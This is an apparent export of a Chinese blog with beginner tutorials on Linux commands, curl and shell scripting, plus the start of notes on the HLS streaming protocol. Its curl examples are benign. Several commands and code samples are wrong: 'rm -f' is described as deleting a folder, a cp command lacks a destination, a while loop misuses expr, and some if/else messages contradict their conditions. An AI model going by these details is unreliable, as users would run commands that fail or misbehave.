 移動到目前資料夾下的 examples 資料夾：
 $ cd ./examples

 移動到家目錄：~：
 $ cd ~

 移動到上一層目錄 ..：
 $ cd ..

 移動到根目錄 /：
 $ cd /

mkdir：make directory，創建新資料夾
 $ mkdir examples

cp：copy，複製檔案
 先將字串 TEST 存入 README.md 文件中
 $ echo &quot;TEST&quot; &gt; README.md

 $ cp README.md

mv：move (rename) files，移動檔案或是重新命名檔案
 移動檔案：
 $ mv README.md /examples/README.md

 重新命名
 $ mv README.md README_MV.md

rm：remove file，刪除檔案
 $ rm README.md

 刪除目前資料夾下副檔名為 .js 檔案：
 $ rm *.js

 刪除資料夾和所有檔案：
 $ rm -f examples

touch：用來更新已存在文件的 timestamp 時間戳記或是新增空白檔案
 $ touch README.md

cat：將文件印出在終端機上
 $ cat README.md

tail：顯示檔案最後幾行內容
$ tail README.md

持續顯示更新內容，常用於 web server 看 log debug 使用：
$ tail -f README.md

more：將檔案一頁頁印在終端機上
可以使用上下移動換頁，按 q 離開：
$ more README.md

file：檢查檔案類型
$ file README.md// README.md: HTML document text, UTF-8 Unicode text

編輯文字檔案
nano：在終端機編輯文字檔案
 編輯或是新增文字檔案：
 $ nano README.md

 啟動編輯完後可以使用 Ctrl + X 離開，Ctrl + V 移動到上一頁，Ctrl + Y 移動到下一頁，Ctrl + W 搜尋文字內容 

vim：在終端機編輯文字檔案
 $ vim README.md

 啟動後，使用 i 進入編輯，esc 離開編輯模式，:q 不儲存離開，:wq 儲存離開，:q! 強制離開


檔案權限設定在 Linux 系統中，每一個 Linux 檔案都具有四種存取權限：

可讀取（r，Readable），用數字 4 表示
可寫入（w，writable），用數字 2 表示
可執行：（x，eXecute），用數字 1 表示
無權限（-），用數字 0 表示

系統管理者依據使用者需求來設定檔案權限，若我們想檢視檔案權限可以使用 $ ls -l 來查看


第一欄：使用者權限 由 10 個字元組成，第一個字元表示檔案型態（- 為檔案，d 表示目錄，1 表示連結檔案）。字元 2、3、4 表示檔案擁有者的存取權限。字元 5、6、7 表示檔案擁有者所屬群組成員的存取權限。字元 8、9、10 表示其他使用者的存取權限
 舉例來說 -rwxrwxr–，代表這是一格檔案，擁有者和群組都具備讀取、寫入和執行權限，其他使用者只擁有讀取權限

第二欄：檔案數量

第三欄：擁有者

第四欄：群組

第五欄：檔案大小

第六欄：檔案建立時間

第七欄：檔案名稱


接下來介紹如何透過指令修改權限：

chmod：修改檔案權限
 將權限設為 rw-rw-r--：
 $ chmod 664 README.md

 將檔案的使用者和群組加入執行權限
 $ chmod ug+x README.md

chown：修改檔案擁有者與群組
 $ chown www-data:www-data README.md

系統管理
sudo：使用最高權限（superuser）執行指令，會要求輸入自己密碼，使用上必須非常小心
 $ sudo git clone xxx.py

su：su 指令可以讓一般的 Linux 使用者輸入 root 密碼取得 root 權限，暫時取得 root 權限的使用者就如同 root 一樣可以對系統進行各種變更動作
 $ su

kill：根據 Process ID 指定要終止程式
 $ kill PID

 立即強制執行：
 $ kill -9 PID

killall：直接使用程式的名稱來指定要終止的程式
 $ killall hello.py

套件管理
apt-get：套件管理工具
 更新套件資料庫列表：
 $ sudo apt-get update

 升級套件並下載安裝套件：
 $ sudo apt-get upgrade

 搜尋相關軟體套件（使用名稱）：
 $ apt-cache search --names-only fortune

 安裝套件：
 $ sudo apt-get install fortune

 移除套件：
 $ sudo apt-get remove fortune

網際網路相關操作
ping：網路檢測工具，透過發送 ICMP ECHO_REQUEST 的封包，檢查自己與特定設備之間的網路是否暢通，速度是否正常
 可輸入 hostname 或是 IP：
 $ ping google.com


 PING google.com (172.217.160.110): 56 data bytes 64 bytes from 172.217.160.110: icmp_seq&#x3D;0 ttl&#x3D;57 time&#x3D;7.037 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;1 ttl&#x3D;57 time&#x3D;9.411 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;2 ttl&#x3D;57 time&#x3D;22.690 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;3 ttl&#x3D;57 time&#x3D;6.561 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;4 ttl&#x3D;57 time&#x3D;6.909 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;5 ttl&#x3D;57 time&#x3D;6.311 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;6 ttl&#x3D;57 time&#x3D;6.860 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;7 ttl&#x3D;57 time&#x3D;6.583 ms

traceroutes：檢查從你的電腦到網路另一端的主機是走的什麼路徑
 $ traceroute google.com

 traceroute to google.com (172.217.27.142), 64 hops max, 52 byte packets 1  zyxel.home (192.168.1.1)  2.047 ms  1.208 ms  1.888 ms 2  h254.s98.ts.hinet.net (168.95.98.254)  6.189 ms  8.556 ms  5.875 ms 3  168-95-85-2.hinet-ip.hinet.net (168.95.85.2)  7.057 ms  5.796 ms  5.998 ms 4  211-22-226-1.hinet-ip.hinet.net (211.22.226.1)  9.766 ms  10.422 ms 72.14.222.94 (72.14.222.94)  9.744 ms 5  108.170.244.97 (108.170.244.97)  8.386 ms 108.170.244.129 (108.170.244.129)  11.500 ms  12.247 ms 6  209.85.142.13 (209.85.142.13)  7.015 ms  7.505 ms 209.85.240.15 (209.85.240.15)  6.750 ms 7  tsa03s02-in-f142.1e100.net (172.217.27.142)  11.478 ms  6.608 ms  6.893 ms

nslookup：查詢 DNS 回應是否正常
 $ nslookup google.com

 Server:		192.168.1.1 Address:	192.168.1.1#53
 Non-authoritative answer: Name:	google.com Address: 216.58.200.238


其他好用指令
man：查詢 Linux 線上手冊（man page）
 $ man

 例如我們可以使用 man 來查詢 ls 的使用用法：
 $ man ls

find：查詢檔案
 在目前目錄下尋找檔名為 README.md 檔案
 $ find . -name README.md

grep：強大文件字串搜尋工具
 $ grep &#x27;找這個字串&#x27; file_name

 找所有目錄（含子目錄）下檔案
 $ grep -r &#x27;字串&#x27; *

crontab：例行性工作排程
 編輯 crontab
 $ crontab -e

 crontab 格式：
 分 時 日 月 星期 要執行的指令30 12   *   *   *  python /projects/hello.py &amp;在 12:30 時執行 hello.py，&amp; 表示背景執行* 號表示每日每月每星期都執行

撰寫第一個 shell scriptShell 是我們和 Linux 系統的介面，我們可以透過終端機在上面輸入指令和作業系統互動，讓他做我們想做的事情。在 Linux 中標準的 Shell 為（Bourne Again Shell），檔案路徑為 /bin/sh，我們可以透過 $ echo $SHELL 去印出目前使用的 shell
其中 Shell Script 為使用 shell 所提供的語法所撰寫的程式碼，其為直譯式不用編譯。可以讓你將複雜或是重複性的指令寫成程式碼檔案
$ vim example.sh

在編輯模式輸入以下程式碼，：
#!/bin/bash# 這是註解，上面所使用的 shellecho &quot;日期&quot;dateecho &quot;印出檔案列表&quot;ls -l

修改權限成可以執行：
$ chmod u+x example.sh

接著執行，若是一切順利就可以在終端機看到時間日期和檔案列表！恭喜你完成你的第一個 shell script！
$ ./example.sh

總結以上介紹了 Linux&#x2F;Ubuntu 常用指令和基礎操作的入門教學介紹上，實際上讀者不用刻意去背誦，而是在實際上操作中練習，多累積撰寫程式並使用指令碼去加快程式開發的速度自然而然就會把指令碼記憶起來了，若是真的忘記再去網路上查找就好，加油！
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
參考文件
初窥Linux 之 我最常用的20条命令
【Ｌ】Linux 常用指令集
Linux 的 su 與 sudo 指令教學與範例
dig、host 與 nslookup 指令的查詢語法
nslookup — 查詢 DNS 指令
在 Linux 下使用 find 指令查詢目錄與檔案的速查筆記
grep 搜尋目錄下所有檔案字串
第十五章、例行性工作排程(crontab)

（image via unixmen、cloudxlab、ytimg、ytimg、linux、imgur）
]]></content>
      <tags>
        <tag>軟體工程師</tag>
        <tag>軟體工程</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>linux</tag>
        <tag>指令</tag>
        <tag>命令列</tag>
        <tag>command line</tag>
        <tag>script</tag>
        <tag>unix</tag>
        <tag>mac</tag>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Curl Command 指令與基本操作入門教學</title>
    <url>/2019/02/01/linux-curl-command-tutorial/</url>
    <content><![CDATA[
前言身為一個 Web 開發者，往往需要開發不同的 Restful API （Application Programming Interface）來存取資源。在開發完 API 後測試則會使用類似 Postman 的測試工具來進行測試。除了使用 Postman 等 GUI Tool 外，身為一個軟體工程師，當然要學會使用 Linux 指令中的 Curl！這邊我們整理了 Curl 常用的指令，讓大家可以重新溫習，讀者也可以分享自己的常用的指令來提升工作效率。好，那我們就開始吧！
Curl 指令基本介紹與常見用法Curl 是一個在 Linux 上用來透過 HTTP Protocol（HTTP HyperText Transfer Protocol 定義存取網路資源的協定，讓我們可以使用 client &#x2F; server 模式來取得網路資源）下載和上傳檔案的指令（比起 wget 只能下載強大許多）。它基本的指令格式如下：
curl [options] [URL...]

新手上路，我們來看看最基本的用法：
打開終端機（terminal）然後，curl 後面加網址，就會在終端機內顯示回傳的 response，可能是 HTML、JSON 或是 XML 等格式，根據輸入的 URL 內容而定。 
curl https://www.google.com

例如我想要下載：黃色小鴨的圖片，可以使用 -o 搭配欲下載的檔名和網址
curl -o duck.jpg https://im2.book.com.tw/image/getImage?i=https://www.books.com.tw/img/N00/040/56/N000405619.jpg&amp;v=522ff1cf&amp;w=348&amp;h=348

若是使用 -O 則可以直接使用下載網址的檔案檔名來命名下載的檔案（N000405619.jpg）：
curl -O https://im2.book.com.tw/image/getImage?i=https://www.books.com.tw/img/N00/040/56/N000405619.jpg&amp;v=522ff1cf&amp;w=348&amp;h=348

有可能在下載過程中被中斷，若是想要從中斷的地方繼續的話，可以使用 -C 選項：
curl -C - -O http://releases.ubuntu.com/18.04/ubuntu-18.04-desktop-amd64.iso

若希望可以跟隨著網址 301&#x2F;302 redirect 的話，可以使用 -L 選項：
curl -L http://google.com

可以比較沒有使用 -L 的回應：
$ curl http://google.com&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;TITLE&gt;301 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;301 Moved&lt;/H1&gt;The document has moved&lt;A HREF=&quot;http://www.google.com/&quot;&gt;here&lt;/A&gt;.&lt;/BODY&gt;&lt;/HTML&gt;

若我們要追蹤整個 curl 過程並將結果存入 debugdump.txt 檔案可以使用 --trace-ascii 指令：
curl --trace-ascii debugdump.txt http://www.example.com/
$ cat debugdump.txt== Info:   Trying 93.184.216.34...== Info: TCP_NODELAY set== Info: Connected to www.example.com (93.184.216.34) port 80 (#0)=&gt; Send header, 142 bytes (0x8e)0000: GET / HTTP/1.10010: Host: www.example.com0027: User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; T0067: rident/5.0)0074: Accept: */*0081: Referer:008c:&lt;= Recv header, 17 bytes (0x11)0000: HTTP/1.1 200 OK&lt;= Recv header, 31 bytes (0x1f)0000: Cache-Control: max-age=604800&lt;= Recv header, 40 bytes (0x28)0000: Content-Type: text/html; charset=UTF-8&lt;= Recv header, 37 bytes (0x25)0000: Date: Sat, 02 Feb 2019 13:54:23 GMT&lt;= Recv header, 31 bytes (0x1f)0000: Etag: &quot;1541025663+gzip+ident&quot;&lt;= Recv header, 40 bytes (0x28)0000: Expires: Sat, 09 Feb 2019 13:54:23 GMT&lt;= Recv header, 46 bytes (0x2e)0000: Last-Modified: Fri, 09 Aug 2013 23:54:35 GMT&lt;= Recv header, 24 bytes (0x18)0000: Server: ECS (sjc/4E44)&lt;= Recv header, 23 bytes (0x17)0000: Vary: Accept-Encoding&lt;= Recv header, 14 bytes (0xe)0000: X-Cache: HIT&lt;= Recv header, 22 bytes (0x16)0000: Content-Length: 1270&lt;= Recv header, 2 bytes (0x2)0000:&lt;= Recv data, 1270 bytes (0x4f6)0000: &lt;!doctype html&gt;.&lt;html&gt;.&lt;head&gt;.    &lt;title&gt;Example Domain&lt;/title&gt;.0040: .    &lt;meta charset=&quot;utf-8&quot; /&gt;.    &lt;meta http-equiv=&quot;Content-type0080: &quot; content=&quot;text/html; charset=utf-8&quot; /&gt;.    &lt;meta name=&quot;viewport00c0: &quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;.    &lt;style ty0100: pe=&quot;text/css&quot;&gt;.    body &#123;.        background-color: #f0f0f2;.0140:      margin: 0;.        padding: 0;.        font-family: &quot;Open S0180: ans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;.        .01c0:    &#125;.    div &#123;.        width: 600px;.        margin: 5em auto;.0200:        padding: 50px;.        background-color: #fff;.        bo0240: rder-radius: 1em;.    &#125;.    a:link, a:visited &#123;.        color: #0280: 38488f;.        text-decoration: none;.    &#125;.    @media (max-wid02c0: th: 700px) &#123;.        body &#123;.            background-color: #fff;.0300:         &#125;.        div &#123;.            width: auto;.            mar0340: gin: 0 auto;.            border-radius: 0;.            padding:0380: 1em;.        &#125;.    &#125;.    &lt;/style&gt;    .&lt;/head&gt;..&lt;body&gt;.&lt;div&gt;.03c0: &lt;h1&gt;Example Domain&lt;/h1&gt;.    &lt;p&gt;This domain is established to be0400: used for illustrative examples in documents. You may use this.0440:   domain in examples without prior coordination or asking for pe0480: rmission.&lt;/p&gt;.    &lt;p&gt;&lt;a href=&quot;http://www.iana.org/domains/exampl04c0: e&quot;&gt;More information...&lt;/a&gt;&lt;/p&gt;.&lt;/div&gt;.&lt;/body&gt;.&lt;/html&gt;.== Info: Curl_http_done: called premature == 0== Info: Connection #0 to host www.example.com left intact

使用 Curl 來進行 HTTP Request除了簡易的下載檔案或是取得網頁內容外，Curl 還支援各種不同 HTTP 請求方法（HTTP method），以下列出常用指令和選項參數：
-X/--request [GET|POST|PUT|DELETE|PATCH]  使用指定的 http method 來發出 http request-H/--header                           設定 request 裡所攜帶的 header-i/--include                          在 output 顯示 response 的 header-d/--data                             攜帶 HTTP POST Data -v/--verbose                          輸出更多的訊息方便 debug-u/--user                             攜帶使用者帳號、密碼-b/--cookie                           攜帶 cookie（可以是參數或是檔案位置）


GET

簡易一個 URL 版本，可以攜帶 query string 參數取得網路資源：
$ curl https://example.com?q1=123&amp;q2=abc

在同一個指令使用多個 URL：
$ curl http://example1.com http://example2.com


Form POST

一般而言我們 Form 表單的 HTML 會長這樣：
&lt;form method=&quot;POST&quot; action=&quot;form.php&quot;&gt;   &lt;input type=text name=&quot;email&quot;&gt;   &lt;input type=submit name=press value=&quot; OK &quot;&gt;&lt;/form&gt;

由於 Form post 是使用 application/x-www-form-urlencoded Content-Type，所以傳遞的值需要編碼：
＄ curl -X POST --data &quot;email=test@example.com&amp;press=%20OK%20&quot;  http://www.example.com/form.php


File Upload POST另一種常見 Form 表單是有涉及檔案上傳（使用 multipart&#x2F;form-data Content-Type）：

&lt;form method=&quot;POST&quot; enctype=&#x27;multipart/form-data&#x27; action=&quot;upload.php&quot;&gt; &lt;input type=file name=upload&gt; &lt;input type=submit name=press value=&quot;OK&quot;&gt;&lt;/form&gt;

可以看到指令會需要攜帶 upload 檔案：
$ curl -X POST -F &#x27;file=@./upload.txt&#x27; http://www.example.com/upload.php


常見 Restful CRUD 指令：

GET 單一和全部資源
 $ curl -X GET &quot;http://www.example.com/api/resources&quot;$ curl -X GET &quot;http://www.example.com/api/resources/1&quot;

POST JSON 資料： 
 $ curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot; : false, &quot;name&quot; : &quot;Jack&quot;&#125;&#x27; &quot;http://www.example.com/api/resources&quot;

PUT JSON 資料： 
 $ curl -X PUT -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot; : false &#125;&#x27; &quot;http://www.example.com/api/resources&quot;

DELETE 資源：
 $ curl -X DELETE &quot;http://www.example.com/api/resources/1&quot;


攜帶 cookie


在指令中輸入 cookie：
$ curl --cookie &quot;name=Jack&quot; http://www.example.com

從檔案讀取 cookie：
$ curl --cookie stored_cookies_file_path http://www.example.com


攜帶 User Agent

$ curl --user-agent &quot;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&quot; http://www.example.com


Basic Authentication

若所存取網頁有使用 Basic Authentication，可以攜帶 --user username:password 來通過驗證：
$ curl -i --user secret:vary_secret http://www.example.com/api/resources


總結以上介紹了 Linux Curl 常用指令和基礎操作的入門教學介紹：

GET&#x2F;POST&#x2F;PUT&#x2F;DELETE 操作
下載檔案
Form 表單操作
檔案上傳
Restful CRUD 指令
User Agent
Basic Authentication

之後讀者除了使用 Postman 等 GUI Tool 外，也可以使用 Curl 來進行 HTTP endpoint 的測試和開發上！讀者也可以分享自己的常用的指令來提升工作效率！
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
參考文件
Upload files with CURL

（image via linuxinsider）
]]></content>
      <tags>
        <tag>軟體工程師</tag>
        <tag>軟體工程</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>linux</tag>
        <tag>指令</tag>
        <tag>命令列</tag>
        <tag>command line</tag>
        <tag>script</tag>
        <tag>unix</tag>
        <tag>mac</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>簡明 Linux Shell Script 入門教學</title>
    <url>/2019/11/15/linux-shell-script-tutorial/</url>
    <content><![CDATA[
前言Shell 是一種讓使用者可以和作業系統 Kernel（核心用來控制 CPU、記憶體、硬碟等硬體）互動溝通的橋樑。Shell Script 主要是使用在 Linux 和 MacOS 等 Unix-like 作業系統的自動化操作指令的程式語言。其透過 Unix shell 命令列直譯器來執行（我們這邊主要使用 bash shell，其他的 Unix shell 觀念大致類似），使用方式有點類似直譯式程式語言（不用編譯直接執行）。在 Windows 系列家族也有類似的使用方式：Batch file。

一般情況 Shell Script 常用於系統管理、自動化操作檔案、自動化重複的指令碼、分析 log 等文件檔案、列印呈現我們想要的資料等，透過程式語言的使用來減少重複瑣碎的工作，所以若能妥善使用將提升不少開發者和軟體工程師的日常工作效率。接著我們將透過日常生活常用的使用情境，帶領讀者們進入入門 Shell Script（讀者需要具備基本 Linux 指令碼的基本觀念，若你需要複習常見 Linux 指令可以參考 Linux Command 命令列指令與基本操作入門教學）。
Shell Script 初體驗在撰寫 Shell Script 之前我們先來了解 Shell Script 撰寫的流程和架構。一般我們會使用 .sh 副檔名來命名 Shell Script 檔案。然後將該檔案設定為可執行：
chmod +x demo.sh

可以透過檢視檔案詳細資料觀看是否已有 +x 的執行權限：
ls -l demo.sh# -rwxr-xr-x  1 user  staff  106 Nov 16 10:41 demo.sh

執行 Shell Script 檔案：
./demo.sh

接著，我們先利用一個簡單的範例：將目前執行 process 的 PID 依照數字大小排序，取出前 10 名，來了解撰寫 Shell Script 的基本架構。
# 宣告使用 /bin/bash#!/bin/bashecho &quot;=== 將目前執行 process 的 PID 依照數字大小排序，取出前 10 名 === &quot;# ps 為列出 process 相關資訊，透過 | pipe 管線傳遞資料。awk 可以根據 pattern 進行資料處理（這邊印出第一欄 PID）而 sort 是進行排序，其排序時，預設都是把資料當作字串來排序，若想讓資料根據實際數值的大小來排序，可以加上 -n 參數。-r 則是由大到小排序，預設是由小到大ps | awk &#x27;&#123;print $1&#125;&#x27; | sort -rn | head -10

執行結果：
$ ./demo.sh=== 將目前執行 process 的 PID 依照數字大小排序，取出前 10 名 ===83784837837595675955759547595274069740687354337621

恭喜你，你已經完成了第一個 Shell Script 程式了！
變數一般來說程式語言中變數是用來暫存接下來會使用到的資料或是儲存指到物件的參考位置。在 Shell Script 可以使用以下三種方式來宣告變數並給定值：
#!/bin/bashvariable1=value# 若是值內有空白則需要使用 &#x27;&#x27; 或 &quot;&quot; 包裹起來variable2=&#x27;value 2&#x27;variable3=&quot;value 3&quot;


註解使用 #，因為沒有多行註解，所以需要使用多單行註解達到

使用變數方式為 $&#123;變數名稱&#125;，花括號主要是輔助了解變數的範圍：
#!/bin/bashpathName=demo.sh# echo 是列印值，印出變數 pathName 內容 demo.shecho $&#123;pathName&#125;

更新變數直接重新 assign 值即可：
#!/bin/bashpathName=demo1.sh# 印出 demo1.shecho $&#123;pathName&#125;pathName=demo2.sh# 印出 demo2.shecho $&#123;pathName&#125;

刪除變數使用 unset：
#!/bin/bashpathName=demo.sh# 印出 demo.shecho $&#123;pathName&#125;unset pathName# 空值echo $&#123;pathName&#125;


注意系統環境變數為全域變數、區域變數則為 Shell Script 內部程式使用，不能跨檔案使用。

運算式運算式是當運算子和運算元計算結果回傳後賦值給變數。在 Bash Shell 中內建原生不支援運算式，但我們可以使用 expr、awk 等指令來支援實現運算式。
算式我們可以使用四則運算來賦值：
#!/bin/bashresult=`expr 10 + 2`# 12echo &quot;Result: $result&quot;

條件判斷在 Shell Script 中同樣可以使用 if..else 條件判斷，特別注意的是在 Shell Script 中使用 fi 為結尾（為 if 的倒寫法，同樣的接下來討論的 case 也有類似用法），代表條件判斷結束。== 為等於，!= 為不等於運算子。
if#!/bin/shx=20y=30if [ $x == $y ]; then   echo &quot;value x is equal to value y&quot;fiif [ $x != $y ]; then   echo &quot;value x is not equal to value y&quot;fi

if else在 Shell Script 可以使用 -gt （greater than 縮寫）和 -lt （less than 縮寫）代表大於和小於，而 -ge （greater equal 縮寫）和 -le（less equal 縮寫）則是大於等於和小於等於的運算子符號。

記得比較條件需要放在 [] 中，前後要留空白

#!/bin/bashif [ $x -gt $y ]; then   echo &quot;value x is greater than value y&quot;else   echo &quot;value x is not greater than value y&quot;fiif [ $x -lt $y ]; then   echo &quot;value x is not less than value y&quot;else   echo &quot;value x is not less than value y&quot;fiif [ $x -ge $y ]; then   echo &quot;value x is greater or equal than value y&quot;else   echo &quot;value x is not greater than value y&quot;fiif [ $x -le $y ]; then   echo &quot;value x is not less or equal than value y&quot;else   echo &quot;value x is not less or equal than value y&quot;fi

if elif else若有多個條件需要判斷，可以使用 if elif else：
#!/bin/bashvalue1=20value2=30value3=30if [ $value1 -gt $value2 ]; then   echo &quot;value1 is greater than value2&quot;elif [ $value1 == $value3 ]; then   echo &quot;value1 is equal to value3&quot;else   echo &quot;other result&quot;fi

case … esac若要使用類似一般程式語言的 switch 來處理多種條件判斷時，可以使用 case 來進行判斷：
#!/bin/bashlanguage=&#x27;Java&#x27;case $language in    Java*) echo &quot;是 Java！&quot;            ;;    Python*) echo &quot;是 Python！&quot;            ;;    C*)     echo &quot;是 C！&quot;            ;;    *)      echo &quot;沒 match 到！&quot;esac

迴圈當我們需要重複某些瑣碎的任務或是迭代取得資料就需要迴圈來支援。此時可以使用 for、while 和 until 迴圈進行迭代。
forShell Script 的 for 使用方法和一般程式語言類似，同樣可以針對條件使用 break、continue 來跳出或是跳過迴圈。
#!/bin/bashfor loop in 1 2 3; do    echo &quot;number: $loop&quot;done

while若是需要設定一個條件直到該條件為止，可以使用 while，但要注意避免無限迴圈狀況：
#!/bin/bashcounter=0while [ $counter -le 5 ]; do    counter=&#x27;expr $counter+1&#x27;    echo $counterdone

until直到某個條件結束可以使用 until 來進行：
#!/bin/bash# 從 0 印出數字直到 10counter=0until [ $counter -gt 10 ]; do   echo $counter   counter=`expr $counter + 1`done

函式隨著我們的程式越來越大，我們需要透過模組化或是將重複使用的程式碼改成函式。函式基本架構如下：

函式名稱（function 關鍵字為選擇性）
是否有傳入參數
函式內操作
是否有回傳值

function function_name () &#123;    # 做一些事情    [ 回傳值 ]&#125;

函式範例：
#!/bin/bashfunction echoHello() &#123;    # hello world, rock!!    echo &quot;$&#123;0&#125; hello $&#123;1&#125;, $&#123;2&#125;!!&quot;&#125;echoHello &#x27;world&#x27; &#x27;rock&#x27;

以上我們可以看到使用 &quot;&quot; 雙引號把字串和變數取出來印出（你可以試試看使用單引號會發生什麼事情），與一般程式語言比較不同的是其函式呼叫不需要有小括號傳入參數，直接以空白當作參數傳遞的格式。注意參數從 1 開始，$&#123;0&#125; 為檔名。
特殊變數在 Shell Script 檔案和函式往往需要透過傳入參數來設定執行程式的內容。在 Shell Script 支援許多好用的特殊變數，可以方便我們透過使用變數方式來設置程式執行的流程。



指令
描述
註解



$0
目前的檔案檔名



$n
n 從 1 開始，代表第幾個參數



$#
傳遞到程式或函式目前有幾個參數



$*
傳遞到程式或函式所有參數



$@
類似 $* 但是在被雙引號包含時有些許不同



$?
上一個指令退出狀態或是函式的返回值



$$
目前 process PID



透過執行 ./demo_special_var.sh var1 var2：
#!/bin/bashecho &quot;$0&quot;echo &quot;$1&quot;echo &quot;$#&quot;echo &quot;$*&quot;echo &quot;$@&quot;echo &quot;$?&quot;echo &quot;$$&quot;

印出結果：
./demo.shvar12var1 var2var1 var2080417

總結以上我們透過循序漸進入門了 Shell Script 並撰寫了我們第一個 Shell Script 程式，並了解如何在 Shell Script 中使用變數、條件判斷、迴圈、函式以及特殊變數。Shell Script 常用於系統管理、自動化操作檔案、自動化重複的指令碼、分析 log 等文件檔案、列印呈現我們想要的資料等，透過程式語言的使用來減少重複瑣碎的工作，快把 Shell Script 放入你的工具箱中吧！若能妥善使用將提升不少開發者和軟體工程師的日常工作效率。
參考文件
Wiki Shell 指令碼
Wiki 核心 (電腦科學)
鳥哥的 Linux 私房菜

（image via stackoverflow）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>軟體工程師</tag>
        <tag>軟體工程</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>linux</tag>
        <tag>指令</tag>
        <tag>命令列</tag>
        <tag>command line</tag>
        <tag>script</tag>
        <tag>unix</tag>
        <tag>mac</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>curl</tag>
        <tag>shell script</tag>
      </tags>
  </entry>
  <entry>
    <title>直播協定 hls 筆記</title>
    <url>/2016/12/03/livestreamming-hls-note/</url>
    <content><![CDATA[前言最近剛好在做直播相關的東西，雖然說是做前端，但還是必須懂一些直播的原理至少要知道有哪些格式，以及各種格式的優缺點是什麼，做起來也會比較踏實
這篇就簡單記錄一些心得跟資料，如果想比較深入了解 hls 的，可以參考下面這兩篇文章：

直播协议的选择：RTMP vs. HLS
在线视频之HLS协议—学习笔记：M3U8格式讲解及实际应用分析

hls 是什麼？我覺得以直播來說，hls 是一個相當好懂的協定，其實就是透過一個 .m3u8 的播放列表，然後裡面有多個 .ts 的檔案你只要照著播放列表裡面給你的檔案順序播放就好了，聽起來很容易吧！
為了讓大家更明白，直接附上擷取自某處的播放列表：
#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-MEDIA-SEQUENCE:4454#EXT-X-TARGETDURATION:4#EXTINF:3.998, no desc25133_src/4460.ts#EXTINF:3.992, no desc25133_src/4461.ts#EXTINF:3.985, no desc25133_src/4462.ts#EXTINF:3.979, no desc25133_src/4463.ts#EXTINF:3.996, no desc25133_src/4464.ts

就算你沒看過這個格式，你大概看一下也可以猜出來它在做什麼每一個 ts 就是一個片段，然後 #EXTINF:3.996 代表這個片段的時間長度#EXT-X-TARGETDURATION:4，這邊的數字必須比播放清單中的任何一個影片的時間都大。代表播放器應該每隔幾秒去抓一次新的播放清單  
例如說，下一次抓到的可能會長這樣：  
#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-MEDIA-SEQUENCE:4455#EXT-X-TARGETDURATION:4#EXTINF:3.992, no desc25133_src/4461.ts#EXTINF:3.985, no desc25133_src/4462.ts#EXTINF:3.979, no desc25133_src/4463.ts#EXTINF:3.996, no desc25133_src/4464.ts#EXTINF:3.998, no desc25133_src/4465.ts

就是最後面多了一個片段。所以只要一直維持這個規則，就能夠不斷取到新的片段那如果很不巧的，server 沒有及時產生出播放列表怎麼辦呢？
例如說在第 4 秒的時候去拿，發現沒更新，server 在第 4.5 秒才把新的播放片段產生出來。如果發生這種「拿了播放清單，但長的一樣」的情形，就會把抓取的時間減一半，直到抓到為止。像以上情形，第 4 秒沒拿到新的，就會隔 2 秒之後再去抓。
這個規則可以參考：HTTP Live Streaming draft-pantos-http-live-streaming-20

When a client loads a Playlist file for the first time or reloads a   Playlist file and finds that it has changed since the last time it   was loaded, the client MUST wait for at least the target duration   before attempting to reload the Playlist file again, measured from   the last time the client began loading the Playlist file.


If the client reloads a Playlist file and finds that it has not   changed then it MUST wait for a period of one-half the target   duration before retrying.

至於做直播最關心的延遲問題，也可以直接從這個播放列表直接推測出來以上面的例子來說，一共有 5 個片段，每一個片段 4 秒，延遲就是 20 秒Apple 官方建議的是 3 個片段，每個片段 10 秒

What duration should media files be?A duration of 10 seconds of media per file seems to strike a reasonable balance for most broadcast content.


How many files should be listed in the index file during a continuous, ongoing session?The normal recommendation is 3, but the optimum number may be larger.

可參考：Apple: HTTP Live Streaming Overview
不過依照官方的建議，就會有 30 秒的延遲，當然延遲越久直播的狀況會越好，可是體驗也會比較差一點。因此，我們可以來看看幾個直播網站都是怎麼設定的
先來看看直播大頭：Twitch  
